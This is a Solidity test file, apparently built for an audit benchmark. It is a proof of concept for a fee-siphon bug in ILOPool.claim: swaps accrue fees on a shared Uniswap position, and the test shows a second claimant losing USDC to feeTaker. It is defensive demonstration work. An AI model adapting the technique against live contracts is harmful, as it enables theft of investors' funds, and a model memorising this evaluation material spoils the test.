// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

// P82 PoC handoff pilot — Vultisig 2024-06 H-01 (ILOPool.claim fee-siphon on a shared Uniswap position).
// Built from SOURCE BEHAVIOR (not the answer-key text). Reuses the repo's own IntegrationTestBase harness.
import "./IntegrationTestBase.sol";
import '../src/interfaces/IILOPool.sol';
import '../src/interfaces/IILOWhitelist.sol';
import '../src/interfaces/IILOVest.sol';
import '@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol';

/// @dev minimal Uniswap V3 swapper to accrue real swap fees on the ILO pool
contract PoolSwapper {
    uint160 constant MIN_SQRT = 4295128739 + 1;
    uint160 constant MAX_SQRT = 1461446703485210103287273052203988822378723970342 - 1;
    function doSwap(address pool, bool zeroForOne, int256 amountSpecified) external {
        IUniswapV3Pool(pool).swap(address(this), zeroForOne, amountSpecified,
            zeroForOne ? MIN_SQRT : MAX_SQRT, abi.encode(pool));
    }
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        address pool = abi.decode(data, (address));
        if (amount0Delta > 0) IERC20(IUniswapV3Pool(pool).token0()).transfer(pool, uint256(amount0Delta));
        if (amount1Delta > 0) IERC20(IUniswapV3Pool(pool).token1()).transfer(pool, uint256(amount1Delta));
    }
}

contract H01ClaimFeeSiphonTest is IntegrationTestBase {
    address iloPool;
    PoolSwapper swapper;

    function setUp() external {
        _setupBase();
        iloPool = _initPool(PROJECT_OWNER, _getInitPoolParams());
        swapper = new PoolSwapper();
    }

    // ---- minimal helpers (mirrors ILOPool.t.sol) ----
    function _list(address a) internal pure returns (address[] memory r){ r=new address[](1); r[0]=a; }
    function _prepareBuyFor(address inv) internal {
        vm.prank(PROJECT_OWNER); IILOWhitelist(iloPool).batchWhitelist(_list(inv));
        vm.prank(inv); IERC20(USDC).approve(iloPool, 1e30);
        _writeTokenBalance(USDC, inv, 1e27);
    }
    function _buyFor(address inv, uint64 t, uint256 amt) internal {
        vm.warp(t); vm.prank(inv); IILOPool(iloPool).buy(amt, inv);
    }
    function _launchTwoInvestors() internal {
        _prepareBuyFor(INVESTOR);   _buyFor(INVESTOR,   SALE_START+1, 50000 ether);
        _prepareBuyFor(INVESTOR_2); _buyFor(INVESTOR_2, SALE_START+1, 40000 ether);
        _writeTokenBalance(SALE_TOKEN, iloPool, 95000 * 4 ether);
        vm.warp(SALE_END + 1);
        vm.prank(address(iloManager));
        IILOPool(iloPool).launch();
    }
    function _accrueFees(uint256 size, uint256 iters) internal {
        // fund swapper with both tokens and trade back and forth to accrue LP fees on the shared position
        _writeTokenBalance(USDC, address(swapper), 1e30);
        _writeTokenBalance(SALE_TOKEN, address(swapper), 1e30);
        address pool = projectId; // ILO uses the uniV3 pool == projectId
        for (uint256 i = 0; i < iters; i++) {
            swapper.doSwap(pool, true, int256(size));   // USDC -> SALE
            swapper.doSwap(pool, false, int256(size));  // SALE -> USDC
        }
    }
    function _tryClaim(address who, uint256 id) internal returns (bool ok, uint256 a0) {
        vm.prank(who);
        try IILOPool(iloPool).claim(id) returns (uint256 x0, uint256 x1) { x1; return (true, x0); }
        catch { return (false, 0); }
    }

    /// @notice H-01 INVARIANT (holds on correct code): a position's claim proceeds are INDEPENDENT of whether
    ///         another LP claimed first. On the vulnerable source, the first claimant's pool.collect(max) sweeps
    ///         the WHOLE shared position's fees and routes the other LP's fee share to feeTaker; so INVESTOR_2
    ///         receives strictly FEWER tokens when INVESTOR claims first. assertEq below FAILS on vulnerable source.
    function testH01_ClaimProceedsAreOrderIndependent() external {
        _launchTwoInvestors();
        _accrueFees(20000 ether, 40); // accrue swap fees well above the 0.1% platform-fee buffer
        vm.warp(VEST_END_1 + 1); // full unlock

        uint256 idB = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR_2, 0);

        // Scenario A: INVESTOR_2 claims FIRST (fair baseline)
        uint256 snap = vm.snapshot();
        uint256 beforeA = IERC20(USDC).balanceOf(INVESTOR_2);
        vm.prank(INVESTOR_2); IILOPool(iloPool).claim(idB);
        uint256 fairUSDC = IERC20(USDC).balanceOf(INVESTOR_2) - beforeA;
        vm.revertTo(snap);

        // Scenario B: INVESTOR claims first, THEN INVESTOR_2 claims the SAME position at the SAME unlock/price
        uint256 idA = IILOPool(iloPool).tokenOfOwnerByIndex(INVESTOR, 0);
        vm.prank(INVESTOR); IILOPool(iloPool).claim(idA);
        uint256 beforeB = IERC20(USDC).balanceOf(INVESTOR_2);
        (bool okB, ) = _tryClaim(INVESTOR_2, idB);
        uint256 buggedUSDC = IERC20(USDC).balanceOf(INVESTOR_2) - beforeB;

        emit log_named_uint("INVESTOR_2 USDC, claiming FIRST  (fair)  ", fairUSDC);
        emit log_named_uint("INVESTOR_2 claim succeeded when SECOND? (1=yes,0=revert)", okB ? 1 : 0);
        emit log_named_uint("INVESTOR_2 USDC, claiming SECOND (bugged) ", buggedUSDC);
        emit log_named_uint("USDC lost by INVESTOR_2 due to earlier claim", fairUSDC > buggedUSDC ? fairUSDC - buggedUSDC : 0);

        // INVARIANT (correct code): claiming second must (a) not revert and (b) pay the same as claiming first.
        assertTrue(okB, "H-01: INVESTOR_2 claim REVERTS after INVESTOR claimed first (fees already swept to feeTaker)");
        assertEq(buggedUSDC, fairUSDC, "H-01: INVESTOR_2 receives fewer tokens when another LP claimed first (fee share siphoned to feeTaker)");
    }
}
